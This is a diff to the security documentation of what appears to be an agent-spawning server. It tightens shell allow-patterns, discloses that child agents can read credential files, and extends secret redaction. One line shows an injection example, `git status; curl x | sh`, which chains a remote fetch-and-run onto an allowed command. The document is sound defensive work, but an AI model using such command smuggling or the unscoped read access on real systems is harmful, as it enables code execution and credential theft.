@@ -57,6 +57,19 @@ less restricted than their definition earns:
 - **Read-only by default.** An agent gets `read`/`grep`/`glob` only. Shell is
   OFF unless the definition lists `allowed_commands` patterns, which become the
   profile's scoped `allowedCommands`. `--trust-all-tools` is never passed.
+- **Shell patterns are linted at load time.** A pattern like `git status.*`
+  matches `git status; curl x | sh`, so it is rejected. Patterns must be
+  anchored and provably unable to match shell metacharacters — safe literals,
+  `(a|b)` groups, and `[^…]` classes excluding `` ;&|<>$` `` and newline, e.g.
+  ``^git (status|log)[^;&|<>$`\n]*$``. A definition with an unsafe pattern
+  fails the server at startup.
+- **Read access is NOT path-scoped (known limitation).** kiro-cli 2.21 ignores
+  read-path restrictions in `toolsSettings` (verified empirically), so a child
+  can read any file the job's user can — including credentials — and return
+  them in its output. Redaction (below) catches common token shapes and PEM
+  private-key blocks, but treat child output as able to contain anything the
+  user account can read. Run the server under a job user whose HOME holds
+  nothing secret beyond what the job needs.
 - **Writes need two keys.** A write tool appears only when the definition sets
   `write: true` **and** the tool caller names a `write_dir`; writes are
   confined to that directory.
@@ -67,8 +80,8 @@ less restricted than their definition earns:
   and `KIRO_API_KEY` — nothing else. In particular `GITHUB_TOKEN`/`GH_TOKEN`
   are never forwarded. The forwarded set is logged to stderr per spawn.
 - **Redaction.** Secret-shaped strings (`ksk_`, `ghp_`/`gho_`/`github_pat_`,
-  AWS access keys and labeled secrets, JWTs) are redacted from every tool
-  result.
+  AWS access keys and labeled secrets, JWTs, PEM private-key blocks) are
+  redacted from every tool result.
 - **Definitions are trusted code-adjacent data.** They load from the server's
   own directory (or an explicit `--definitions` / `AGENT_WORKFLOWS_DIR`
   override), never from the caller's cwd. `includeMcpJson` is false in every
@@ -87,9 +100,8 @@ Agent (`agents/<name>.md`):
 ---
 name: repo-analyst
 description: Inspects the current repository read-only.
-allowed_commands: # optional; omit for no shell at all
-  - "git status.*"
-  - "git log.*"
+allowed_commands: # optional; omit for no shell at all. Anchored + metacharacter-excluding (linted at load)
+  - "^git (status|log)[^;&|<>$`\\n]*$"
 write: false # optional; true still requires the caller's write_dir
 network: false # optional; gates network clients in allowed_commands
 model: null # optional model override
